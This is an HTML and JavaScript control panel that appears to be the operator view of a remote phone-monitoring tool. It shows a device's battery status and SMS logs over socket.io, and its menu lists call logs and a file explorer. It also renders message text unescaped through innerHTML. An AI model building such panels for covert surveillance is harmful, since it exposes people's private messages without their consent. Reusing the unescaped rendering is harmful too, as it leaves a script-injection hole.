<!DOCTYPE html>
<html>
<head>
    <title>Control Panel</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        :root {
            --sidebar-bg: #2c3e50; --main-bg: #ecf0f1; --accent: #1abc9c;
            --blue: #2980b9; --dark: #34495e;
        }
        body { font-family: 'Segoe UI', sans-serif; background: var(--main-bg); margin: 0; display: flex; }

        /* SIDEBAR */
        .sidebar { width: 250px; background: var(--sidebar-bg); color: #ecf0f1; position: fixed; height: 100vh; }
        .sidebar-header { background: var(--accent); color: white; padding: 20px; font-weight: bold; text-align: center; }
        .nav-item { padding: 15px 20px; cursor: pointer; border-bottom: 1px solid #34495e; transition: 0.3s; }
        .nav-item:hover, .nav-item.active { background: #34495e; color: var(--accent); }

        /* MAIN */
        .main-content { margin-left: 250px; flex-grow: 1; }
        .top-nav { height: 70px; background: white; display: flex; justify-content: flex-end; align-items: center; padding: 0 40px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        
        /* TECHNICAL BATTERY */
        .battery-container { display: flex; align-items: center; gap: 10px; }
        .battery-box { padding: 5px 12px; border-radius: 4px; font-weight: bold; font-size: 1.1rem; }
        .online { background: #d4efdf; color: #145a32; }
        .offline { background: #fadbd8; color: #7b241c; }
        .icon-stack { position: relative; font-size: 2rem; display: flex; align-items: center; justify-content: center; }
        #charging-bolt { position: absolute; font-size: 1.2rem; color: #f1c40f; display: none; text-shadow: 0 0 3px black; }

        /* TABULAR VIEW */
        .view-section { display: none; padding: 30px; }
        .view-section.active { display: block; }
        
        table { width: 100%; border-collapse: collapse; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        th { background: var(--dark); color: white; padding: 15px; text-align: left; }
        td { padding: 12px 15px; border-bottom: 1px solid #ddd; font-size: 0.95rem; }
        tr:hover { background: #f9f9f9; }
        .type-incoming { color: #27ae60; font-weight: bold; }
        .type-outgoing { color: #2980b9; font-weight: bold; }

        /* DASHBOARD */
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; }
        .card { background: white; padding: 25px; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; border-left: 5px solid var(--accent); }
    </style>
</head>
<body>

    <div class="sidebar">
        <div class="sidebar-header">SYSTEM CONTROL</div>
        <div class="nav-item active" onclick="showView('dashboard')">üè† Dashboard</div>
        <div class="nav-item" onclick="showView('sms')">‚úâÔ∏è SMS Logs</div>
        <div class="nav-item">üìû Call Logs</div>
        <div class="nav-item">üìÇ File Explorer</div>
    </div>

    <div class="main-content">
        <div class="top-nav">
            <div class="battery-container">
                <div id="bat-box" class="battery-box offline"><span id="bat-pct">--</span>%</div>
                <div class="icon-stack">
                    <span>üîã</span>
                    <span id="charging-bolt">‚ö°</span>
                </div>
            </div>
        </div>

        <section id="dashboard" class="view-section active">
            <h2>Dashboard Overview</h2>
            <div class="grid">
                <div class="card" onclick="showView('sms')">
                    <div>
                        <div style="color: #7f8c8d; font-size: 0.9rem;">TOTAL MESSAGES</div>
                        <div id="sms-count" style="font-size: 2rem; font-weight: bold;">0</div>
                    </div>
                    <div style="font-size: 2.5rem;">‚úâÔ∏è</div>
                </div>
            </div>
        </section>

        <section id="sms" class="view-section">
            <h2>SMS Logs Table</h2>
            <table>
                <thead>
                    <tr>
                        <th>Type</th>
                        <th>Number</th>
                        <th>Message</th>
                        <th>Date/Time</th>
                    </tr>
                </thead>
                <tbody id="sms-table-body">
                    <tr><td colspan="4" style="text-align:center;">Requesting data from device...</td></tr>
                </tbody>
            </table>
        </section>
    </div>

    <script>
        const socket = io();

        function showView(viewId) {
            document.querySelectorAll('.view-section').forEach(s => s.classList.remove('active'));
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            document.getElementById(viewId).classList.add('active');
            
            if(viewId === 'sms') {
                socket.emit('get-sms-request');
            }
        }

        socket.on('ui-battery', (data) => {
            document.getElementById('bat-pct').innerText = data.percent;
            document.getElementById('bat-box').className = "battery-box online";
            document.getElementById('charging-bolt').style.display = data.charging ? "block" : "none";
        });

        socket.on('ui-sms-display', (smsArray) => {
            document.getElementById('sms-count').innerText = smsArray.length;
            const body = document.getElementById('sms-table-body');
            body.innerHTML = smsArray.map(m => `
                <tr>
                    <td class="type-${m.type.toLowerCase()}">${m.type}</td>
                    <td><b>${m.address}</b></td>
                    <td>${m.body}</td>
                    <td style="color:#7f8c8d; font-size:0.85rem;">${new Date(m.date).toLocaleString()}</td>
                </tr>
            `).join('');
        });

        socket.on('device-status', (status) => {
            if(!status.online) document.getElementById('bat-box').className = "battery-box offline";
        });
    </script>
</body>
</html>
